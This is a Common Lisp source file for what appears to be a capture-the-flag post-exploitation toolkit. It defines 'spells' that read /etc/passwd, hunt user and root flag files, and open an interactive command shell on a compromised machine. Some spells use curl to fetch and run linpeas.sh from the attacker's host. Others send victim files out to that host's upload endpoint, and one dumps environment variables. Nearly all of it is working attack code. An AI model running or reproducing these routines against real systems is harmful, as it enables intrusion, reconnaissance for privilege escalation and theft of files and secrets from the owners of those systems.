(in-package :grimoire)
 
(defvar *spells* (make-hash-table :test #'equal))

(defstruct spell
  name needs function)

(defmacro define-spell (name glyphs args &body body)
  "create a spell called `name` that needs `glyphs` and takes `args`"
  `(progn 
     (defun ,name ,args
       ,@(loop for c in glyphs
               collect `(glyph/available? ,c))
       ,@body)
     (setf (gethash (string-upcase ',name) *spells*)
           (make-spell :name ',name
                       :needs ',glyphs
                       :function #',name))))

(defun spell/runnable? (spell)
  (loop for glyph in (spell-needs spell)
        always (glyph/available? glyph :do-not-fail t)))

(defun spell/list (&key show-all)
  (loop for spell being the hash-value in *spells*
        for runnable = (spell/runnable? spell)
        if (and (not show-all) runnable)
        do (out "[+] Spell \"~a\"~%" (spell-name spell))
        and do (out "    Runnable? ~a (needs ~{:~a~^, ~})~%" 
                    (yes? runnable)
                    (spell-needs spell))))

;; read

(define-spell system-info (:read) ()
  "read system information"
  (parse-key=value (use :read "/etc/os-release")))

(define-spell all-users (:read) ()
  "list all the users from /etc/passwd"
  (loop for line in (str:lines (use :read "/etc/passwd"))
        if (not (alexandria:emptyp line))
        collect (car (str:split ":" line))))

(define-spell users (:read) ()
  "list the users that are not default"
  (remove-if
   #'(lambda (u) (member u *default-users* :test #'string=))
   (all-users)))

(define-spell flag (:read) (&key username root)
  "try to read the flag from user home folders"
  (flet ((try-for-flag (u)
           (format t "[+] Trying to read ~a's flag...~%" u)
           (ignore-errors
             (str:trim
              (use :read (format nil "/home/~a/~a.txt"
                                 u (if root "root" "user")))))))
    (if username
        (try-for-flag username)
        (s:~>> (all-users)
               (mapcar #'try-for-flag)
               (remove-if #'null)
               (remove-if #'a:emptyp)))))

;; exec

(defparameter *current-dir* nil)

(defun exec-keep-pwd (command)
  (if (str:starts-with? "cd " command)
      (setf *current-dir* 
            (glyph/use :exec (fmt "cd ~a && cd ~a && pwd"
                                  *current-dir*
                                  (str:replace-first "cd " "" command))))
      (ignore-errors
        (glyph/use :exec (fmt "cd ~a && ~a" *current-dir* command)))))

(defun fake-shell-prompt (&optional (prepend-newline t))
  (out "~a[~a]$ " 
       (if prepend-newline #\Newline "")
       *current-dir*)
  (force-output)
  (read-line))

(define-spell fake-shell (:exec) ()
  "gives a 'fake' shell that allows for command execution and follows cd commands"
  (setf *current-dir* (use :exec "pwd"))

  ;; shell
  (loop for pnl = nil then t
        for command = (fake-shell-prompt pnl)
        if (string= command "exit") do (return)
        else do (out "~a~%" (exec-keep-pwd command))))

(define-spell linpeas (:exec) ()
  (out "[+] Downloading linpeas~%")
  (use :exec (fmt "curl http://~a:5000/tools/linpeas.sh > /tmp/linpeas.sh"
                  *host-ip*))

  (out "[+] Running linpeas.sh~%")
  (use :exec "sh /tmp/linpeas.sh > /tmp/output.txt")

  (out "[+] Results:~%")
  (use :exec "cat /tmp/output.txt"))

(define-spell list-files (:exec) (path &key absolute-path)
  "returns a list of all files in the path"
  (let ((files (str:split #\Newline (use :exec (fmt "ls ~a" path))))
        (ends-with-slash (str:ends-with? "/" path)))
    (if absolute-path
        (mapcar #'(lambda (f)
                    (if ends-with-slash
                        (str:concat path f)
                        (str:concat path "/" f)))
                files)
        files)))

(define-spell download (:exec) (path)
  "downloads the file to your project's folder"
  (use :exec (fmt "curl -F \"file=@~a\" http://~a:5000/upload/"
                  path *host-ip*)))

(define-spell download-all (:exec) (path)
  "downloads all files in the path to your project's folder"
  (let ((files (list-files path :absolute-path t)))
    (dolist (file files)
      (use :exec (fmt "curl -F \"file=@~a\" http://~a:5000/upload/"
                      file *host-ip*)))))

(define-spell environment (:exec) (&optional key)
  "returns all environment variables"
  (let ((res (parse-key=value (use :exec "set"))))
    (if key
        (cdr (find-if #'(lambda (k) (string= k key)) res :key #'car))
        res)))

(define-spell path (:exec) ()
  (str:split ":" (environment "PATH")))

(define-spell system-binaries (:exec) (&key absolute-path)
  "list the binaries in the default places"
  (remove-duplicates
   (mapcan #'(lambda (p)
               (list-files p :absolute-path absolute-path))
           (path))
   :test #'string=))